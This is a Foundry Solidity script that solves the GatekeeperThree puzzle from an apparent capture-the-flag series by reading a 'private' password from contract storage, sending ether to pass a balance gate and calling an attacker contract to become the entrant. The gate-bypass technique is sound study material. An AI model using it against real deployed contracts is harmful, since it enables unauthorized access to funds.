// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {DevOpsTools} from "foundry-devops/src/DevOpsTools.sol";
import {GatekeeperThree, SimpleTrick} from "@puzzles/28/GatekeeperThree.sol";
import {GatekeeperThreeAttacker} from "@attackers/28/GatekeeperThreeAttacker.sol";

contract GatekeeperThreeSolution is Script {
    function run() external {
        address mostRecentlyDeployedGatekeeperThreeAttacker =
            DevOpsTools.get_most_recent_deployment("GatekeeperThreeAttacker", block.chainid);
        solve(mostRecentlyDeployedGatekeeperThreeAttacker);
    }

    function solve(address attacker) public {
        GatekeeperThreeAttacker gatekeeperThreeAttacker = GatekeeperThreeAttacker(payable(attacker));
        GatekeeperThree gatekeeperThree = gatekeeperThreeAttacker.gatekeeperThree();

        vm.startBroadcast();
        // bypass gateTwo
        gatekeeperThree.createTrick();
        SimpleTrick trick = gatekeeperThree.trick();
        uint256 password = uint256(vm.load(address(trick), bytes32(uint256(2)))); // read password from storage
        console.log("password: ", password);
        gatekeeperThree.getAllowance(uint256(password));
        console.log(trick.checkPassword(password));
        // bypass gateThree
        payable(gatekeeperThree).transfer(0.001 ether + 1);
        console.log("tx.origin: ", tx.origin);
        console.log("balance: ", address(gatekeeperThree).balance);
        gatekeeperThreeAttacker.attack();
        vm.stopBroadcast();

        console.log("new entrant: ", gatekeeperThree.entrant());
    }
}